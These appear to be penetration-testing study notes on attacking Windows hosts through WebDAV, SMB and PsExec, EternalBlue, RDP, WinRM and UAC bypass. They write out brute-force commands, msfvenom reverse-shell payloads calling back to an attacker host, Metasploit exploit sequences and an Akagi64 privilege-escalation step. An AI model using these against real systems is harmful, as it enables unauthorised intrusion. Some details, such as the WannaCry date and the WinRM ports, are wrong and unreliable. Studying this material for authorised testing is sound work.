# Introduction

### What Are System/Host Based Attacks?

- System/Host based attacks are attacks that are targeted towards a
specific system or host running a specific operating system, for example,
Windows or Linux.

- Network services are not the only attack vector that can be targeted
during a penetration test.

- System/Host based attacks usually come in to play after you have gained
access to a target network, whereby, you will be required to exploit
servers, workstations or laptops on the internal network.

### System/Host Based Attacks

- System/Host based attacks are primarily focused on exploiting inherent
vulnerabilities on the target OS.

- Unlike network based attacks, host based attacks are much more
specialized and require an understanding of the target operating system
and the vulnerabilities that affect said operating systems.

- System/Host based attacks involve exploiting misconfigurations and
inherent vulnerabilities within the target OS.

# Overview of Windows Vulnerabilities

### History of Windows Vulnerabilities:

- Microsoft Windows maintains a dominant position in the global operating system market, making it a primary target for cyber threats due to its extensive usage.

- It has faced numerous severe vulnerabilities over the past 15 years, from MS08-067 (Conflicker) to MS17-010 (EternalBlue), which have been relatively easy to exploit due to publicly available exploit code.

- The widespread adoption of Windows amplifies the impact of these vulnerabilities, prompting continuous security updates from Microsoft to safeguard users.

### Windows Vulnerabilities

Microsoft Windows has various OS versions and releases which makes the threat
surface fragmented in terms of vulnerabilities. For example, vulnerabilities that
exist in Windows 7 are not present in Windows 10.

- Regardless of the various versions and releases, all Windows OS’s share a
likeness given the development model and philosophy:

    - Windows OS’s have been developed in the C programming language, making
    them vulnerable to buffer overflows, arbitrary code execution etc.
    - By default, Windows is not configured to run securely and require a proactive
    implementation of security practices in order to configure Windows to run
    securely.
    - Newly discovered vulnerabilities are not immediately patched by Microsoft and
    given the fragmented nature of Windows, many systems are left unpatched.

- The frequent releases of new versions of Windows is also a contributing factor to
exploitation, as many companies take a substantial length of time to upgrade their
systems to the latest version of Windows and opt to use older versions that may
be affected by an increasing number of vulnerabilities.

- In addition to inherent vulnerabilities, Windows is also vulnerable to cross
platform vulnerabilities, for example SQL injection attacks.

- Systems/hosts running Windows are also vulnerable to physical attacks like;
theft, malicious peripheral devices etc.

### Types of Windows Vulnerabilities

- Information disclosure - Vulnerability that allows an attacker to access
confidential data.

- Buffer overflows - Caused by a programming error, allows attackers to write data
to a buffer and overrun the allocated buffer, consequently writing data to
allocated memory addresses.

- Remote code execution - Vulnerability that allows an attacker to remotely execute
code on the target system.

- Privilege escalation - Vulnerability that allows an attacker to elevate their
privileges after initial compromise.

- Denial of Service (DOS) - Vulnerability that allows an attacker to consume a
system/host’s resources (CPU, RAM, Network etc) consequently preventing the
system from functioning normally.

### Frequently Exploited Windows Services

**Microsoft IIS (Internet Information Services):**
- Port: TCP 80/443
- Proprietary web server software developed by Microsoft that runs on Windows.

**WebDAV (Web Distributed Authoring & Versioning):**
- Port TCP 80/443
- HTTP extension that allows clients to update, delete, move and copy files on a web server. WebDAV is used to enable a web server to act as a file server.

**SMB/CIFS (Server Message Block Protocol):**
- Port: 445
- Network file sharing protocol that is used to facilitate the sharing of files and peripherals between computers on a local network (LAN).

**RDP(Remote Desktop Protocol):**
- Port TCP 3389
- Proprietary GUI remote access protocol developed by Microsoft and is used to remotely authenticate and interact with a Windows system.

**WinRM (Windows Remote Management Protocol):**
- Port 5986/443
- Windows remote management protocol that can be used to facilitate remote access with Windows systems.

# Exlpoiting Windows Vulnerabilities

## Microsoft IIS

- IIS (Internet Information Services) is a proprietary extensible web server software developed by Microsoft for use with the Windows NT family.
- It can be used to host websites/web apps and provides administrators with a robust GUI for managing websites.
- IIS can be used to host both static and dynamic web pages developed in ASP.NET and PHP.
- Typically configured to run on ports 80/443.
- Supported executable file extensions: 
    - .asp
    - .aspx 
    - .config 
    - .php

## WebDAV

- WebDAV (Web-based Distributed Authoring and Versioning) is a set of extensions to the HTTP protocol which allow users to collaboratively edit and manage files on remote web servers.
- WebDAV essentially enables a web server to function as a file server for collaborative authoring.
- WebDAV runs on top Microsoft IIS on ports 80/443.
- In order to connect to a WebDAV server, you will need to provide legitimate credentials. This is because WebDAV implements authentication in the form of a username and password.

### WebDAV Exploitation

- The first step of the exploitation process will involve identifying whether WebDAV has been configured to run on the IIS web server.
    - nmap scan with version detection and default scripts
    - *nmap -sV -p 80 --script=http-enum* target

- We can perform a brute-force attack on the WebDAV server in order to identify legitimate credentials that we can use for authentication.
    - *hydra -L userlist -P passlist* target *http-get /webdav/*

- After obtaining legitimate credentials, we can authenticate with the WebDAV server and upload a malicious .asp payload that can be used to execute arbitrary commands or obtain a reverse shell on the target.
    - *davtest -auth login:pass -url* target
    - **cadaver** target
    - webshell:
        - kali linux: /usr/share/webshells/asp, etc.

### WebDAV Metasploit

1. Method: 

    **msfvenom**

    - *msfvenom -p windows/meterpreter/reverse_tcp LHOST=youripaddress LPORT=yourport -f asp > shell.asp*

    Then in msfconsole:
 
        > use multi/handler

        > set payload windows/meterpreter/reverse_tcp (same as created by msfvenom)

2. Method (faster):

    msfconsole:

        > use exploit/windows/iis/iis_webdav_upload_asp

### Tools

- **davtest** - Used to scan, authenticate and exploit a WebDAV server.
    + Pre-installed on most offensive penetration testing distributions like Kali
and Parrot OS.
- **cadaver** - cadaver supports file upload, download, on-screen display, in- place editing, namespace operations (move/copy), collection creation and deletion, property manipulation, and resource locking on WebDAV servers.
    + Pre-installed on most offensive penetration testing distributions like Kali and Parrot OS.

## SMB

- SMB (Server Message Block) is a network file sharing protocol that is used to facilitate the sharing of files and peripherals (printers and serial ports) between computers on a local network (LAN).
- SMB uses port 445 (TCP). However, originally, SMB ran on top of NetBIOS using port 139.
- SAMBA is the open source Linux implementation of SMB, and allows Windows systems to access Linux shares and devices.

### SMB Authentication

- The SMB protocol utilizes two levels of authentication, namely:
    + User Authentication
    + Share Authentication
- User authentication - Users must provide a username and password in order to authenticate with the SMB server in order to access a share.
- Share authentication - Users must provide a password in order to access restricted share.

### PsExec

- PsExec is a lightweight telnet-replacement developed by Microsoft that allows you execute processes on remote windows systems using any user’s credentials.
- PsExec authentication is performed via SMB.
- We can use the PsExec utility to authenticate with the target system legitimately and run arbitrary commands or launch a remote command prompt.
- It is very similar to RDP, however, instead of controlling the remote system via GUI, commands are sent via CMD.

### SMB Exploitation With PsExec

- In order to utilize PsExec to gain access to a Windows target, we will need to identify legitimate user accounts and their respective passwords or password hashes.
- This can be done by leveraging various tools and techniques, however, the most common technique will involve performing an SMB login brute-force attack.
- We can narrow down our brute-force attack to only include common Windows user accounts like:
    + Administrator
- After we have obtained a legitimate user account and password, we can use the credentials to authenticate with the target system via PsExec and execute arbitrary system commands or obtain a reverse shell.

On linux:

- psexec.py user@hostip cmd.exe

### SMB Metasploit

> use auxiliary/scanner/smb/smb_login

> use exploit/windows/smb/psexec 

## MS17-010 EternalBlue Exploit

- EternalBlue (MS17-010/CVE-2017-0144) is the name given to a collection of Windows vulnerabilities and exploits that allow attackers to remotely execute arbitrary code and gain access to a Windows system and consequently the network that the target system is a part of.
- The EternalBlue exploit was developed by the NSA (National Security Agency) to take advantage of the MS17-010 vulnerability and was leaked to the public by a hacker group called the Shadow Brokers in 2017.
- The EternalBlue exploit takes advantage of a vulnerability in the Windows SMBv1 protocol that allows attackers to send specially crafted packets that consequently facilitate the execution of arbitrary commands.

- The EternalBlue exploit was used in the WannaCry ransomware attack on June 27, 2017 to exploit other Windows systems across networks with the objective of spreading the ransomware to as many systems as possible.
- This vulnerability affects multiple versions of Windows:
    - Windows Vista
    - Windows 7
    - Windows Server 2008
    - Windows 8.1
    - Windows Server 2012
    - Windows 10
    - Windows Server 2016

- Microsoft released a patch for the vulnerability in March, 2017, however, many users and companies have still not yet patched their systems.
- The EternalBlue exploit has a MSF auxiliary module that can be used to check if a target system if vulnerable to the exploit and also has an exploit module that can be used to exploit the vulnerability on unpatched systems.
- The EternalBlue exploit module can be used to exploit vulnerable Windows systems and consequently provide us with a privileged meterpreter session on the target system.
- In addition to MSF modules, we can also manually exploit the vulnerability by utilizing publicly available exploit code.

### Tools

**Enumeration:**

- *nmap -sV -p 445 --script=smb-vuln-ms17-010* target

**Exploit:**

- AutoBlue-MS17-010: https://github.com/3ndG4me/AutoBlue-MS17-010

**msfconsole:**

Enum:

> use auxiliary/scanner/smb/smb_ms17_010

Exploit:

> use exploit/windows/smb/ms17_010_eternalblue

## Exploiting RDP

- The Remote Desktop Protocol(RDP) is a proprietary GUI remote access protocol developed by Microsoft and is used to remotely connect and interact with a Windows system.
- RDP uses TCP port 3389 by default,and can also be configured to run on any other TCP port.
- RDP authentication requires a legitimate user account on the target system as well as the user’s password in clear-text.
- We can performan RDP brute-force attack to identify legitimate user credentials that we can use to gain remote access to the target system.

**To check if RDP exists, use msfconsole:**

> use auxiliary/scanner/rdp/rdp_scanner

### Brute-force with hydra

- *hydra -L userlist -P passlist rdp://* target *-s* port *-t* speed (use to slow down preventing the host going nuts)

### xfreerdp

- *xfreerdp /u:* user */p:* password */v:* ip *:* port

## CVE-2019-0708 - BlueKeep

- BlueKeep (CVE-2019-0708) is the name given to an RDP vulnerability in Windows that could potentially allow attackers to remotely execute arbitrary code and gain access to a Windows system and consequently the network that the target system is a part of.
- The BlueKeep vulnerability was made public by Microsoft in May 2019.
- The BlueKeep exploit takes advantage of a vulnerability in the Windows RDP protocol that allows attackers to gain access to a chunk of kernel memory consequently allowing them to remotely execute arbitrary code at the system level without authentication.

- Microsoft released a patch for this vulnerability on May 14th, 2019 and has urged companies to patch this vulnerability as soon as possible.
- At the time of discovery, about 1 million systems worldwide were found to be vulnerable.
- The BlueKeep vulnerability affects multiple versions of Windows: ○ XP
    - Vista
    - Windows 7
    - Windows Server 2008 & R2

**msfconsole:**

> search bluekeep

## WinRM

- Windows Remote Management (WinRM) is a Windows remote management protocol that can be used to facilitate remote access with Windows systems over HTTP(S).
- Microsoft implemented WinRM in to Windows in order to make life easier for system administrators.
- WinRM is typically used in the following ways:
    - Remotely access and interact with Windows hosts on a local network.
    - Remotely access and execute commands on Windows systems.
    - Manage and configure Windows systems remotely.
- WinRM typically uses TCP port 5985 and 5986 (HTTPS).

### Exlpoiting WinRM

- WinRM implements access control and security for communication between systems through various forms of authentication.
- We can utilize a utility called “crackmapexec” to perform a brute-force on WinRM in order to identify users and their passwords as well as execute commands on the target system.
- We can also utilize a ruby script called “evil-winrm” to obtain a command shell session on the target system.

### crackmapexec

**Brute-force:**

- *crackmapexec winrm* target *-u username/userlist -p password/passlist*

**Execute Commands:**

- *crackmapexec winrm* target *-u username -p password -x "command"*

### evil-winrm

- *evil-winrm.rb -u user -p 'password' -i* target

### WinRM Metasploit

> search winrm_script

> use exploit/windows/winrm/winrm_script_exec

> set RHOSTS ip

> set USERNAME user

> set PASSWORD pass

> set FORCE_VBS true

> exploit

# Windows Privilige Escalation

## Privilege Escalation

- Privilege escalation is the process of exploiting vulnerabilities or misconfigurations in systems to elevate privileges from one user to another, typically to a user with administrative or root access on a system.
- Privilege escalation is a vital element of the attack life cycle and is a major determinant in the overall success of a penetration test.
- After gaining an initial foothold on a target system you will be required to elevate your privileges in order to perform tasks and functionality that require administrative privileges.
- The importance of privilege escalation in the penetration testing process cannot be overstated or overlooked. Developing your privilege escalation skills will mark you out as a good penetration tester.

## Windows Kernel

- A Kernel is a computer program that is the core of an operating system and has complete control over every resource and hardware on a system. It acts as a translation layer between hardware and software and facilitates the communication between these two layers.
- Windows NT is the kernel that comes pre-packaged with all versions of Microsoft Windows and operates as a traditional kernel with a few exceptions based on user design philosophy. It consists of two main modes of operation that determine access to system resources and hardware:
    - User Mode – Programs and services running in user mode have limited access to system resources and functionality.
    - Kernel Mode – Kernel mode has unrestricted access to system resources and functionality with the added functionality of managing devices and system memory.

## Windows Kernel Exploits

- Kernel exploits on Windows will typically target vulnerabilities In the Windows kernel to execute arbitrary code in order to run privileged system commands or to obtain a system shell.
- This process will differ based on the version of Windows being targeted and the kernel exploit being used.
- Privilege escalation on Windows systems will typically follow the following methodology:
    - Identifying kernel vulnerabilities
    - Downloading, compiling and transferring kernel exploits onto the target
    system.

## Tools

- Windows-Exploit-Suggester - This tool compares a targets patch levels against the Microsoft vulnerability database in order to detect potential missing patches on the target. It also notifies the user if there are public exploits and Metasploit modules available for the missing bulletins.

## Bypassing UAC with UACMe

- User Account Control (UAC) is a Windows security feature introduced in Windows Vista that is used to prevent unauthorized changes from being made to the operating system.
- UAC is used to ensure that changes to the operating system require approval from the administrator or a user account that is part of the local administrators group.
- A non-privileged user attempting to execute a program with elevated privileges will be prompted with the UAC credential prompt, whereas a privileged user will be prompted with a consent prompt.
- Attacks can bypass UAC in order to execute malicious executables with elevated privileges.

**Bypassing UAC:**

- In order to successfully bypass UAC, we will need to have access to a user account that is a part of the local administrators group on the Windows target system.
- UAC allows a program to be executed with administrative privileges, consequently prompting the user for confirmation.
- UAC has various integrity levels ranging from low to high, if the UAC protection level is set below high, Windows programs can be executed with elevated privileges without prompting the user for confirmation.
- There are multiple tools and techniques that can be used to bypass UAC, however, the tool and technique used will depend on the version of Windows running on the target system.

**UACMe:**

- UACMe is an open source, robust privilege escalation tool developed by @hfire0x. It can be used to bypass Windows UAC by leveraging various techniques.
    - GitHub: https://github.com/hfiref0x/UACME
- The UACME GitHub repository contains a very well documented list of methods that can be used to bypass UAC on multiple versions of Windows ranging from Windows 7 to Windows 10.
- It allows attackers to execute malicious payloads on a Windows target with administrative/elevated privileges by abusing the inbuilt Windows AutoElevate tool.
- The UACMe GitHub repository has more than 60 exploits that can be used to bypass UAC depending on the version of Windows running on the target.

**Creating backdoor:**

- *msfvenom -p windows/meterpreter/reversi_tcp LHOST=hostmachineIP LPORT=someport -f exe > backdoor.exe*
 
### UAC Msfconsole

> use multi/handler

> set payload windows/meterpreter/reverse_tcp

> etc.

On the target machine upload backdoor exec and the UACMe Akagi64 exec to Temp directory.

Then:

- .\Akagi64.exe 23 C:\pathtobackdor 

Now we should have connected with meterpreter with escalated privilidges.
